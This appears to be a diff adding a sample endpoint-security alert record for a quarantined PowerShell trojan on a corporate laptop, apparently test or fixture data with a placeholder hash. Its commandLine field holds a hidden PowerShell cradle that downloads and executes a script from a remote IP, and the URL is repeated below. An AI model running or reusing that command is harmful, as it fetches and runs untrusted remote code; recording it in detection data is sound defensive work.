@@ -1,0 +1,5 @@
+{"threatInfo": {"threatName": "Trojan.PSAttack", "malwareFamilies": ["PSAttack"], "createdAt": "2026-07-23T12:00:00Z", "originatorProcess": "powershell.exe", "commandLine": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('https://185.142.223.14/a.ps1')", "sha256": "1122334455667788990011223344556677889900aabbccddeeff001122334455", "filePath": "C:\\Users\\intern\\Downloads\\update.ps1", "mitigationStatus": "quarantined"}, "agentDetectionInfo": {"agentComputerName": "INTERN-LT-02", "agentDomain": "corp.local"}, "indicators": []}
+
+Attacker URL: https://185.142.223.14/a.ps1
+References:
+https://management.sentinelone.net/console
